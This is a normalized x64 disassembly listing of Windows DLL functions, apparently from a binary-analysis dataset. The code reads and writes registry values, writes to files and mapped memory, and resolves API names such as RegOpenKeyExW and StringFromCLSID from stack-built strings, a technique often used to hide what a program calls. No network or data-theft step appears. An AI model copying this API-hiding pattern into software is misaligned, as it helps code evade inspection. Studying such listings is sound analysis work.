lea r11 [ rsp + 0x30 ]
mov [ rsp + 0x28 ] r11
mov [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
lea rdx [ rsp + 0x48 ]
mov rcx rsi
call [ RegQueryValueExW@IAT ]
test eax eax
je r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov ecx [ rsp + 0x30 ]
mov edx 0x1
call sub_18001d210
mov rbp rax
mov rcx rsi
test rax rax
jne r-xdata
mov rcx rsi
call [ RegCloseKey@IAT ]
nop
mov [ rbx + 0x18 ] 0x7
xor edi edi
mov [ rbx + 0x10 ] rdi
mov [ rbx ] di
xor eax eax
jmp r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] rbp
xor r9d r9d
xor r8d r8d
lea rdx [ rsp + 0x48 ]
call [ RegQueryValueExW@IAT ]
mov rcx rsi
test eax eax
je r-xdata
call [ RegCloseKey@IAT ]
nop
jmp r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov [ rbx ] di
xor eax eax
jmp r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
mov rcx [ rsp + 0x78 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0xb8 ]
add rsp 0x80
pop rdi
pop rsi
pop rbp
retn
call [ RegCloseKey@IAT ]
mov ecx 0x10
call sub_18001c84c
mov rsi rax
test rax rax
je r-xdata
call [ RegCloseKey@IAT ]
mov rcx rbp
call sub_18001c80c
nop
jmp r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rsi rdi
mov eax [ rsp + 0x30 ]
mov [ rsi ] rbp
mov [ rsi + 0x8 ] rax
jmp r-xdata
mov rcx rbx
call sub_180001850
mov rax rsi
sub_18000d520
push rbp
push rsi
push rdi
lea rbp [ rsp - 0x47 ]
sub rsp 0x100
mov [ rbp - 0x61 ] 0xfffffffffffffffe
mov [ rsp + 0x130 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x3f ] rax
mov rdi rdx
mov rbx rcx
xor esi esi
mov [ rbp - 0x69 ] rsi
mov [ rbp - 0x19 ] 0x7
mov [ rbp - 0x21 ] rsi
mov [ rbp - 0x31 ] si
lea r8d [ rsi + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x31 ]
call sub_180003b50
nop
lea rdx [ rbx + 0xb0 ]
lea r8 [ rbp - 0x31 ]
lea rcx [ rbp - 0x9 ]
call sub_18000c880
nop
mov r8 rdi
mov rdx rax
lea rcx [ rbp - 0x59 ]
call sub_18000c760
nop
cmp [ rbp + 0xf ] 0x8
jb r-xdata
mov [ rbp + 0xf ] 0x7
mov [ rbp + 0x7 ] rsi
mov [ rbp - 0x9 ] si
cmp [ rbp - 0x19 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x9 ]
call j_sub_18001c80c
mov [ rbp - 0x19 ] 0x7
mov [ rbp - 0x21 ] rsi
mov [ rbp - 0x31 ] si
mov [ rbp + 0x1f ] 0x61766441
mov [ rbp + 0x23 ] 0x32336970
mov [ rbp + 0x27 ] 0x6c6c642e
mov [ rbp + 0x2b ] 0x0
lea rcx [ rbp + 0x1f ]
call [ GetModuleHandleA@IAT ]
test rax rax
jne r-xdata
mov rcx [ rbp - 0x31 ]
call j_sub_18001c80c
mov [ rbp + 0x2f ] 0x4f676552
mov [ rbp + 0x33 ] 0x4b6e6570
mov [ rbp + 0x37 ] 0x78457965
mov [ rbp + 0x3b ] 0x57
lea rdx [ rbp + 0x2f ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
jne r-xdata
lea rcx [ rbp + 0x1f ]
call [ LoadLibraryA@IAT ]
test rax rax
jne r-xdata
lea rdx [ rbp - 0x59 ]
cmp [ rbp - 0x41 ] 0x8
cmovae rdx [ rbp - 0x59 ]
lea rcx [ rbp - 0x69 ]
mov [ rsp + 0x20 ] rcx
mov r9d 0x2
xor r8d r8d
mov rcx 0xffffffff80000003
call rax
cmp eax 0x2
jne r-xdata
mov rbx [ rbp - 0x69 ]
jmp r-xdata
mov rbx [ rbp - 0x69 ]
jmp r-xdata
test eax eax
je r-xdata
lea rdx [ rbp - 0x59 ]
cmp [ rbp - 0x41 ] 0x8
cmovae rdx [ rbp - 0x59 ]
mov [ rsp + 0x40 ] rsi
lea rax [ rbp - 0x69 ]
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x28 ] 0x2
mov [ rsp + 0x20 ] esi
xor r9d r9d
xor r8d r8d
mov rcx 0xffffffff80000003
call [ RegCreateKeyExW@IAT ]
test eax eax
je r-xdata
cmp [ rbp - 0x41 ] 0x8
jb r-xdata
mov rbx [ rbp - 0x69 ]
mov rbx [ rbp - 0x69 ]
jmp r-xdata
mov rbx [ rbp - 0x69 ]
jmp r-xdata
mov rax rbx
mov rcx [ rbp + 0x3f ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0x130 ]
add rsp 0x100
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rbp - 0x59 ]
call j_sub_18001c80c
sub_18000d720
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x1d0
mov [ rsp + 0x50 ] 0xfffffffffffffffe
mov [ rsp + 0x210 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x1c0 ] rax
mov r12 rdx
mov r13 rcx
mov [ rsp + 0x48 ] rcx
mov [ rsp + 0x40 ] rdx
xor ebx ebx
mov r14d ebx
mov [ rsp + 0x38 ] ebx
lea ecx [ rbx + 0x30 ]
call sub_18001c84c
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
mov rsi rbx
mov rcx rax
call sub_180008850
mov rsi rax
jmp r-xdata
cmp [ rsp + 0xc0 ] 0x8
jb r-xdata
cmp [ rsp + 0x70 ] 0x8
jb r-xdata
mov [ rsp + 0x30 ] rsi
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800088d0
mov [ rsp + 0x70 ] 0x7
mov [ rsp + 0x68 ] rbx
mov [ rsp + 0x58 ] bx
xor r8d r8d
lea rdx [ r--data ]
lea rcx [ rsp + 0x58 ]
call sub_180003b50
nop
mov ecx [ rw-data ]
mov rax 0xcccccccccccccccd
mul rcx
shr rdx 0x3
lea rax [ rdx + rdx * 4 ]
add rax rax
sub rcx rax
mov eax ecx
lea rcx [ rax + rax * 2 ]
lea rax [ rw-data ]
lea rdx [ rax + rcx * 4 ]
mov r8d 0xc
mov rcx rsi
call sub_1800088c0
lea rdx [ rsp + 0xa8 ]
mov rcx rsi
call sub_1800092e0
mov rdi rax
lea rax [ rsp + 0x58 ]
cmp rax rdi
je r-xdata
jmp r-xdata
mov rcx [ rsp + 0xa8 ]
call j_sub_18001c80c
nop
mov [ rsp + 0x70 ] 0x7
mov [ rsp + 0x68 ] rbx
mov [ rsp + 0x58 ] bx
cmp [ rdi + 0x18 ] 0x8
jae r-xdata
mov rcx [ rsp + 0x58 ]
call j_sub_18001c80c
movsx ecx [ rw-data ]
mov edi [ rw-data ]
imul ecx edi
mov eax 0x80808081
mul ecx
shr edx 0x7
imul edx edx 0xff
sub ecx edx
mov [ rw-data ] cl
movsx ecx [ rw-data ]
imul ecx edi
mov eax 0x80808081
mul ecx
shr edx 0x7
imul edx edx 0xff
sub ecx edx
mov [ rw-data ] cl
movsx ecx [ rw-data ]
imul ecx edi
mov eax 0x80808081
mul ecx
shr edx 0x7
imul edx edx 0xff
sub ecx edx
mov [ rw-data ] cl
movsx ecx [ rw-data ]
imul ecx edi
mov eax 0x80808081
mul ecx
shr edx 0x7
imul edx edx 0xff
sub ecx edx
mov [ rw-data ] cl
mov r8d 0x54
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800088c0
lea rdx [ rsp + 0x198 ]
mov rcx rsi
call sub_1800092e0
nop
movzx eax [ rw-data ]
mov [ rsp + 0x20 ] ax
lea r9 [ rsp + 0x198 ]
lea r8 [ rsp + 0x58 ]
lea rdx [ rsp + 0x148 ]
mov rcx r13
call sub_18000c8e0
nop
lea rcx [ r13 + 0x60 ]
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rsp + 0x148 ]
call sub_180001ac0
mov r8d 0x54
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800088c0
lea rdx [ rsp + 0x170 ]
mov rcx rsi
call sub_1800092e0
nop
movzx eax [ rw-data ]
mov [ rsp + 0x20 ] ax
lea r9 [ rsp + 0x170 ]
lea r8 [ rsp + 0x58 ]
lea rdx [ rsp + 0x120 ]
mov rcx r13
call sub_18000c8e0
nop
lea rcx [ r13 + 0x88 ]
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rsp + 0x120 ]
call sub_180001ac0
test rsi rsi
je r-xdata
mov rax [ rdi ]
mov [ rsp + 0x58 ] rax
mov [ rdi ] rbx
mov r8 [ rdi + 0x10 ]
inc r8
add r8 r8
mov rdx rdi
lea rcx [ rsp + 0x58 ]
call sub_18001c4a0
jmp r-xdata
test r12 r12
je r-xdata
mov rcx rsi
call sub_180008890
mov rcx rsi
call j_sub_18001c80c
mov rax [ rdi + 0x10 ]
mov [ rsp + 0x68 ] rax
mov rax [ rdi + 0x18 ]
mov [ rsp + 0x70 ] rax
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] rbx
mov [ rdi ] bx
mov dil 0x1
mov [ rsp + 0x98 ] 0x7
mov [ rsp + 0x90 ] rbx
mov [ rsp + 0x80 ] bx
xor eax eax
or rcx 0xffffffffffffffff
mov rdi r12
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx r12
lea rcx [ rsp + 0x80 ]
call sub_180003b50
mov r14d 0x1
cmp [ rsp + 0x90 ] 0x2
jb r-xdata
test dil dil
je r-xdata
cmp [ rsp + 0x98 ] 0x8
jb r-xdata
xor dil dil
jmp r-xdata
mov [ rsp + 0xe8 ] 0x7
mov [ rsp + 0xe0 ] rbx
mov [ rsp + 0xd0 ] bx
mov r8d 0x1
lea rdx [ r--data ]
lea rcx [ rsp + 0xd0 ]
call sub_180003b50
nop
mov [ rsp + 0x98 ] 0x7
mov [ rsp + 0x90 ] rbx
mov [ rsp + 0x80 ] bx
xor eax eax
or rcx 0xffffffffffffffff
mov rdi r12
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx r12
lea rcx [ rsp + 0x80 ]
call sub_180003b50
nop
lea r8 [ rsp + 0xd0 ]
lea rdx [ rsp + 0x80 ]
lea rcx [ rsp + 0xa8 ]
call sub_18000c6d0
nop
lea r8 [ rsp + 0x148 ]
mov rdx rax
lea rcx [ rsp + 0xf8 ]
call sub_18000c760
nop
lea rcx [ r13 + 0x10 ]
mov rdx rax
call sub_180003f60
nop
cmp [ rsp + 0x110 ] 0x8
jb r-xdata
lea rcx [ r13 + 0x10 ]
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rsp + 0x148 ]
call sub_180001ac0
lea rcx [ r13 + 0x38 ]
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rsp + 0x120 ]
call sub_180001ac0
jmp r-xdata
mov rcx [ rsp + 0x80 ]
call j_sub_18001c80c
test r14b 0x1
je r-xdata
mov [ rsp + 0x110 ] 0x7
mov [ rsp + 0x108 ] rbx
mov [ rsp + 0xf8 ] bx
cmp [ rsp + 0xc0 ] 0x8
jb r-xdata
mov rcx [ rsp + 0xf8 ]
call j_sub_18001c80c
cmp [ rsp + 0x138 ] 0x8
jb r-xdata
mov [ rsp + 0xc0 ] 0x7
mov [ rsp + 0xb8 ] rbx
mov [ rsp + 0xa8 ] bx
cmp [ rsp + 0x98 ] 0x8
jb r-xdata
mov rcx [ rsp + 0xa8 ]
call j_sub_18001c80c
mov [ rsp + 0x138 ] 0x7
mov [ rsp + 0x130 ] rbx
mov [ rsp + 0x120 ] bx
cmp [ rsp + 0x188 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x120 ]
call j_sub_18001c80c
mov [ rsp + 0x98 ] 0x7
mov [ rsp + 0x90 ] rbx
mov [ rsp + 0x80 ] bx
cmp [ rsp + 0xe8 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x80 ]
call j_sub_18001c80c
mov [ rsp + 0x188 ] 0x7
mov [ rsp + 0x180 ] rbx
mov [ rsp + 0x170 ] bx
cmp [ rsp + 0x160 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x170 ]
call j_sub_18001c80c
mov [ rsp + 0xe8 ] 0x7
mov [ rsp + 0xe0 ] rbx
mov [ rsp + 0xd0 ] bx
mov r8d 0x1
lea rdx [ r--data ]
lea rcx [ rsp + 0xd0 ]
call sub_180003b50
nop
mov [ rsp + 0x98 ] 0x7
mov [ rsp + 0x90 ] rbx
mov [ rsp + 0x80 ] bx
xor eax eax
or rcx 0xffffffffffffffff
mov rdi r12
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx r12
lea rcx [ rsp + 0x80 ]
call sub_180003b50
nop
lea r8 [ rsp + 0xd0 ]
lea rdx [ rsp + 0x80 ]
lea rcx [ rsp + 0xf8 ]
call sub_18000c6d0
nop
lea r8 [ rsp + 0x120 ]
mov rdx rax
lea rcx [ rsp + 0xa8 ]
call sub_18000c760
nop
lea rcx [ r13 + 0x38 ]
mov rdx rax
call sub_180003f60
nop
cmp [ rsp + 0xc0 ] 0x8
jb r-xdata
mov rcx [ rsp + 0xd0 ]
call j_sub_18001c80c
mov [ rsp + 0x160 ] 0x7
mov [ rsp + 0x158 ] rbx
mov [ rsp + 0x148 ] bx
cmp [ rsp + 0x1b0 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x148 ]
call j_sub_18001c80c
mov [ rsp + 0xc0 ] 0x7
mov [ rsp + 0xb8 ] rbx
mov [ rsp + 0xa8 ] bx
cmp [ rsp + 0x110 ] 0x8
jb r-xdata
mov rcx [ rsp + 0xa8 ]
call j_sub_18001c80c
mov [ rsp + 0x1b0 ] 0x7
mov [ rsp + 0x1a8 ] rbx
mov [ rsp + 0x198 ] bx
cmp [ rsp + 0x70 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x198 ]
call j_sub_18001c80c
mov [ rsp + 0x110 ] 0x7
mov [ rsp + 0x108 ] rbx
mov [ rsp + 0xf8 ] bx
cmp [ rsp + 0x98 ] 0x8
jb r-xdata
mov rcx [ rsp + 0xf8 ]
call j_sub_18001c80c
mov rcx [ rsp + 0x1c0 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0x210 ]
add rsp 0x1d0
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov rcx [ rsp + 0x58 ]
call j_sub_18001c80c
mov [ rsp + 0x98 ] 0x7
mov [ rsp + 0x90 ] rbx
mov [ rsp + 0x80 ] bx
cmp [ rsp + 0xe8 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x80 ]
call j_sub_18001c80c
mov rcx [ rsp + 0xd0 ]
call j_sub_18001c80c
nop
sub_18000def0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x20
xor bpl bpl
cmp [ rdx + 0x18 ] 0x8
mov rbx rdx
mov rdi rcx
jb r-xdata
mov rcx rdx
mov rcx [ rdx ]
jmp r-xdata
mov r8d r12d
mov rdx rax
mov rcx rbx
call [ ExpandEnvironmentStringsW@IAT ]
mov rcx rsi
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
je r-xdata
mov rbx [ rbx ]
xor r8d r8d
xor edx edx
call [ ExpandEnvironmentStringsW@IAT ]
mov edx 0x2
mov ecx eax
mov r12d eax
add rcx 0x2
call sub_18001d210
cmp [ rbx + 0x18 ] 0x8
mov rsi rax
jb r-xdata
mov rcx rsi
call sub_18001c80c
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
movzx eax bpl
mov rbp [ rsp + 0x38 ]
add rsp 0x20
pop r12
retn
mov rdx rsi
mov rcx rdi
call sub_18000d720
mov rcx [ rdi + 0xe0 ]
mov bpl 0x1
test rcx rcx
je r-xdata
mov rcx [ rdi + 0xd8 ]
test rcx rcx
je r-xdata
xor edx edx
call sub_18000e6d0
xor edx edx
call sub_18000e6d0
sub_18000dfd0
push rbp
push rbx
push rsi
push rdi
push r12
lea rbp [ rsp - 0xa0 ]
sub rsp 0x1a0
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x90 ] rax
mov rdi r8
mov rsi rdx
mov rbx rcx
lea rdx [ rbp - 0x80 ]
call sub_18000ccb0
nop
cmp [ rbp - 0x70 ] 0x0
jne r-xdata
mov [ rbp + 0x70 ] 0x33656c4f
mov [ rbp + 0x74 ] 0x6c642e32
mov [ rbp + 0x78 ] 0x6c
lea rcx [ rbp + 0x70 ]
call [ GetModuleHandleA@IAT ]
test rax rax
jne r-xdata
jmp r-xdata
mov [ rbp + 0x80 ] 0x69727453
mov [ rbp + 0x84 ] 0x7246676e
mov [ rbp + 0x88 ] 0x4c436d6f
mov [ rbp + 0x8c ] 0x444953
test rax rax
je r-xdata
lea rcx [ rbp + 0x70 ]
call [ LoadLibraryA@IAT ]
cmp [ rbp - 0x68 ] 0x8
jb r-xdata
mov [ rbp - 0x40 ] 0x7
xor r12d r12d
mov [ rbp - 0x48 ] r12
mov [ rbp - 0x58 ] r12w
xor eax eax
or rcx 0xffffffffffffffff
mov rdx [ rsp + 0x20 ]
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rcx [ rbp - 0x58 ]
call sub_180003b50
nop
mov [ rsp + 0x48 ] 0x7
mov [ rsp + 0x40 ] r12
mov [ rsp + 0x30 ] r12w
lea r8d [ r12 + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
call sub_180003b50
nop
mov [ rsp + 0x70 ] 0x7
mov [ rsp + 0x68 ] r12
mov [ rsp + 0x58 ] r12w
lea r8d [ r12 + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x58 ]
call sub_180003b50
nop
lea r8 [ rsp + 0x58 ]
lea rdx [ rbp - 0x80 ]
lea rcx [ rbp + 0x48 ]
call sub_18000c880
nop
mov r8 rsi
mov rdx rax
lea rcx [ rbp + 0x20 ]
call sub_18000c760
nop
lea r8 [ rsp + 0x30 ]
mov rdx rax
lea rcx [ rbp - 0x8 ]
call sub_18000c6d0
nop
lea r8 [ rbp - 0x58 ]
mov rdx rax
lea rcx [ rbp - 0x30 ]
call sub_18000c6d0
nop
lea rcx [ rbx + 0xb0 ]
mov rdx rax
call sub_180003f60
nop
cmp [ rbp - 0x18 ] 0x8
jb r-xdata
lea rdx [ rbp + 0x80 ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov rcx [ rbp + 0x90 ]
xor rcx rsp
call sub_18001d1f0
add rsp 0x1a0
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
mov rcx [ rbp - 0x80 ]
call j_sub_18001c80c
mov [ rbp - 0x18 ] 0x7
mov [ rbp - 0x20 ] r12
mov [ rbp - 0x30 ] r12w
cmp [ rbp + 0x10 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x30 ]
call j_sub_18001c80c
lea rdx [ rsp + 0x20 ]
mov rcx rdi
call rax
mov [ rbp + 0x10 ] 0x7
mov [ rbp + 0x8 ] r12
mov [ rbp - 0x8 ] r12w
cmp [ rbp + 0x38 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x8 ]
call j_sub_18001c80c
mov [ rbp + 0x38 ] 0x7
mov [ rbp + 0x30 ] r12
mov [ rbp + 0x20 ] r12w
cmp [ rbp + 0x60 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x20 ]
call j_sub_18001c80c
mov [ rbp + 0x60 ] 0x7
mov [ rbp + 0x58 ] r12
mov [ rbp + 0x48 ] r12w
cmp [ rsp + 0x70 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x48 ]
call j_sub_18001c80c
mov [ rsp + 0x70 ] 0x7
mov [ rsp + 0x68 ] r12
mov [ rsp + 0x58 ] r12w
cmp [ rsp + 0x48 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x58 ]
call j_sub_18001c80c
mov [ rsp + 0x48 ] 0x7
mov [ rsp + 0x40 ] r12
mov [ rsp + 0x30 ] r12w
cmp [ rbp - 0x40 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x30 ]
call j_sub_18001c80c
mov rcx [ rbp - 0x58 ]
call j_sub_18001c80c
nop
sub_18000e290
push rbx
push rbp
push rsi
push rdi
sub rsp 0x88
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x78 ] rax
mov ebp r9d
mov rbx r8
mov [ rsp + 0x30 ] edx
mov [ rsp + 0x40 ] rbx
mov rdx r8
call sub_18000d520
mov rsi rax
test rax rax
jne r-xdata
xor edi edi
mov [ rsp + 0x48 ] di
xor eax eax
mov [ rsp + 0x4a ] rax
mov [ rsp + 0x52 ] rax
mov [ rsp + 0x5a ] rax
mov [ rsp + 0x62 ] rax
mov [ rsp + 0x6a ] rax
mov [ rsp + 0x72 ] eax
mov [ rsp + 0x76 ] ax
mov r9d ebp
lea r8 [ r--data ]
lea edx [ rdi + 0x18 ]
lea rcx [ rsp + 0x48 ]
call sub_18001d620
mov [ rsp + 0x28 ] 0x4
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rax
lea r9d [ rdi + 0x4 ]
xor r8d r8d
lea rdx [ rsp + 0x48 ]
mov rcx rsi
call [ RegSetValueExW@IAT ]
mov rcx rsi
test eax eax
je r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
call [ RegCloseKey@IAT ]
nop
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
call [ RegCloseKey@IAT ]
nop
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
xor edi edi
xor al al
jmp r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
mov al 0x1
mov rcx [ rbx ]
call j_sub_18001c80c
xor al al
jmp r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov [ rbx ] di
mov rcx [ rsp + 0x78 ]
xor rcx rsp
call sub_18001d1f0
add rsp 0x88
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_18000e3c0
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0x80
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov r12d r9d
mov rbx r8
mov rbp rdx
mov [ rsp + 0x38 ] rbx
mov rdx r8
call sub_18000d520
mov rsi rax
test rax rax
jne r-xdata
xor edi edi
mov [ rsp + 0x40 ] di
xor eax eax
mov [ rsp + 0x42 ] rax
mov [ rsp + 0x4a ] rax
mov [ rsp + 0x52 ] rax
mov [ rsp + 0x5a ] rax
mov [ rsp + 0x62 ] rax
mov [ rsp + 0x6a ] eax
mov [ rsp + 0x6e ] ax
mov r9d r12d
lea r8 [ r--data ]
lea edx [ rdi + 0x18 ]
lea rcx [ rsp + 0x40 ]
call sub_18001d620
mov r11 [ rbp + 0x8 ]
mov rax [ rbp ]
mov [ rsp + 0x28 ] r11d
mov [ rsp + 0x20 ] rax
lea r9d [ rdi + 0x3 ]
xor r8d r8d
lea rdx [ rsp + 0x40 ]
mov rcx rsi
call [ RegSetValueExW@IAT ]
mov rcx rsi
test eax eax
je r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
call [ RegCloseKey@IAT ]
nop
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
call [ RegCloseKey@IAT ]
nop
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
xor edi edi
xor al al
jmp r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
mov al 0x1
mov rcx [ rbx ]
call j_sub_18001c80c
xor al al
jmp r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov [ rbx ] di
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_18001d1f0
add rsp 0x80
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_18000e4f0
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0x70
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov r12 r9
mov rbp r8
mov rsi rcx
mov [ rsp + 0x28 ] rcx
lea rax [ r--data ]
mov [ rcx ] rax
lea rax [ r--data ]
mov [ rcx + 0x8 ] rax
mov [ rcx + 0x28 ] 0x7
xor ebx ebx
mov [ rcx + 0x20 ] rbx
mov [ rcx + 0x10 ] bx
mov [ rcx + 0x50 ] 0x7
mov [ rcx + 0x48 ] rbx
mov [ rcx + 0x38 ] bx
mov [ rcx + 0x78 ] 0x7
mov [ rcx + 0x70 ] rbx
mov [ rcx + 0x60 ] bx
mov [ rcx + 0xa0 ] 0x7
mov [ rcx + 0x98 ] rbx
mov [ rcx + 0x88 ] bx
lea rdi [ rcx + 0xb0 ]
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] rbx
mov [ rdi ] bx
call sub_18000d720
mov [ rdi + 0x10 ] rbx
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov [ rdi ] bx
mov [ rsp + 0x50 ] 0x7
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x38 ] bx
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rbp
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx rbp
lea rcx [ rsp + 0x38 ]
call sub_180003b50
nop
mov r8 r12
lea rdx [ rsp + 0x38 ]
mov rcx rsi
call sub_18000dfd0
nop
cmp [ rsp + 0x50 ] 0x8
jb r-xdata
mov rdi [ rdi ]
mov edi [ rw-data ]
mov [ rsp + 0x50 ] 0x7
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x38 ] bx
xor r8d r8d
lea rdx [ r--data ]
lea rcx [ rsp + 0x38 ]
call sub_180003b50
mov rax [ rsi ]
mov r8d edi
lea rdx [ rsp + 0x38 ]
mov rcx rsi
call [ rax + 0x8 ]
mov edi eax
mov ecx 0x58
call sub_18001c84c
mov [ rsp + 0x20 ] rax
test rax rax
je r-xdata
mov rcx [ rsp + 0x38 ]
call j_sub_18001c80c
mov rax rbx
mov r8b 0x1
mov edx edi
mov rcx rax
call sub_18000ee10
jmp r-xdata
mov [ rsi + 0xe0 ] rbx
mov rax rsi
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_18001d1f0
add rsp 0x70
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
xor r8d r8d
xor edx edx
mov rcx rax
call sub_18000ee10
mov rbx rax
mov [ rsi + 0xd8 ] rax
mov ecx 0x58
call sub_18001c84c
mov [ rsp + 0x20 ] rax
test rax rax
je r-xdata
sub_18000e6e0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x30
mov rdi rcx
add rcx 0x50
mov ebp r8d
mov r12 rdx
call sub_18001c2b4
mov rcx [ rdi ]
xor r9d r9d
xor r8d r8d
mov [ rsp + 0x20 ] 0x0
lea edx [ r9 + 0x2 ]
call [ MapViewOfFile@IAT ]
mov rsi rax
test rax rax
jne r-xdata
mov eax [ rdi + 0x40 ]
mov r8 rbp
mov rdx r12
mov [ rax + rsi ] ebp
add [ rdi + 0x40 ] 0x4
mov ecx [ rdi + 0x40 ]
add rcx rsi
call sub_18001c4a0
add [ rdi + 0x40 ] ebp
mov rcx rsi
call [ UnmapViewOfFile@IAT ]
lea rcx [ rdi + 0x50 ]
call sub_18001c2bc
mov al 0x1
lea rcx [ rdi + 0x50 ]
call sub_18001c2bc
xor al al
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x30
pop r12
retn
sub_18000e790
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x20 ] rsi
mov [ rsp + 0x18 ] r8d
push rdi
sub rsp 0x30
mov rbx rcx
mov rcx [ rcx + 0x8 ]
mov rdi rdx
mov r9d 0x2
xor r8d r8d
xor edx edx
call [ SetFilePointer@IAT ]
mov r8d [ rsp + 0x50 ]
add r8 0x4
mov eax eax
cmp rax r8
jne r-xdata
mov rcx [ rbx + 0x8 ]
xor esi esi
lea r9 [ rsp + 0x40 ]
lea rdx [ rsp + 0x50 ]
lea r8d [ rsi + 0x4 ]
mov [ rsp + 0x40 ] esi
mov [ rsp + 0x20 ] rsi
call [ WriteFile@IAT ]
cmp [ rsp + 0x40 ] 0x4
mov rcx [ rbx + 0x8 ]
je r-xdata
mov rcx [ rbx + 0x8 ]
xor r9d r9d
xor r8d r8d
xor edx edx
call [ SetFilePointer@IAT ]
mov r8d [ rsp + 0x50 ]
lea r9 [ rsp + 0x40 ]
mov rdx rdi
mov [ rsp + 0x20 ] rsi
call [ WriteFile@IAT ]
mov r11d [ rsp + 0x40 ]
mov rcx [ rbx + 0x8 ]
cmp [ rsp + 0x50 ] r11d
jne r-xdata
call [ CloseHandle@IAT ]
xor al al
jmp r-xdata
call [ CloseHandle@IAT ]
mov al 0x1
